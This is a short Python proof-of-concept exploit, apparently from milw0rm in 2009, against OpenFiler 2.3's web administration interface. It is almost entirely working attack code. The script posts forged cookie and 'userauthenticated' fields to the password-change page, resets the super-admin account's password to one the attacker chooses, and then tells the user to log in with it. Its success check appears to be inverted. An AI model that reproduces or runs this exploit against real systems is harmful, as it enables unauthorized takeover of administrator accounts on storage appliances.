#Exploit code (PoC) for OpenFiler 2.3 (current)
#by just a nonroot user
#http://nonroot.blogspot.com/
#
import urllib,sys,re
#host example: https://192.168.20.5:446/
host=raw_input("OpenFiler system ( include http and /): ")
#Super admin user
user='openfiler'
#What pass do you want?
password='nonroot'
#use it please ;)
fake="myladyastridcita"
data= urllib.urlencode({'current_password':fake , 'passcookie': fake, 'usercookie': user,'new_password': password,'confirm_new_password': password,'userauthenticated':"666"})
response= urllib.urlopen(host+"account/password.html", data)
data=response.read()
lookup=re.compile("successfully").search
match=lookup(data)
if not  match:
    print "Ok, now go and login with user:", user, " and password: ", password, " in ",host
else:
    print "Exploit failed, sorry, go and find some new bug or check this code and fix it!"
    sys.exit(2)
sys.exit(0)

# milw0rm.com [2009-02-03]